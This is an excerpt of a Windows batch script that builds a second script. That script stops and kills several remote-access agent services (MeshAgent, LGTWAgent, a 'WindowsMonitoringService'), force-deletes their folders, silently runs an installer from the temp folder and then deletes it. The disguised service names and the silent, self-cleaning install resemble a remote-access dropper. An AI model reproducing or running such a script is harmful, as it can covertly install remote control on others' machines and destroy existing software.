...
set "TEMP_DIR=%TEMP%"
set "INSTALLER_NAME=WinMonService-Update.exe"
...
echo net stop "WindowsMonitoringService" ^>nul 2^>^&1
echo net stop "LGTWAgent" ^>nul 2^>^&1
echo net stop "MeshAgent" ^>nul 2^>^&1
echo net stop "Mesh Agent" ^>nul 2^>^&1
echo taskkill /F /IM WindowsMonitoringService64-Lol.exe ^>nul 2^>^&1
echo taskkill /F /IM MeshAgent.exe ^>nul 2^>^&1
echo taskkill /F /IM MeshService64.exe ^>nul 2^>^&1
...
echo if exist "C:\Program Files\WindowsMonitoringService" rmdir /S /Q "C:\Program Files\WindowsMonitoringService" ^>nul 2^>^&1
echo if exist "C:\Program Files (x86)\WindowsMonitoringService" rmdir /S /Q "C:\Program Files (x86)\WindowsMonitoringService" ^>nul 2^>^&1
echo if exist "C:\Program Files\LGTWAgent" rmdir /S /Q "C:\Program Files\LGTWAgent" ^>nul 2^>^&1
echo if exist "C:\Program Files (x86)\LGTWAgent" rmdir /S /Q "C:\Program Files (x86)\LGTWAgent" ^>nul 2^>^&1
echo start /wait "" "%%TEMP%%\%INSTALLER_NAME%" -fullinstall
echo timeout /t 2 /nobreak ^>nul 2^>^&1
echo del /f /q "%%TEMP%%\%INSTALLER_NAME%" ^>nul 2^>^&1
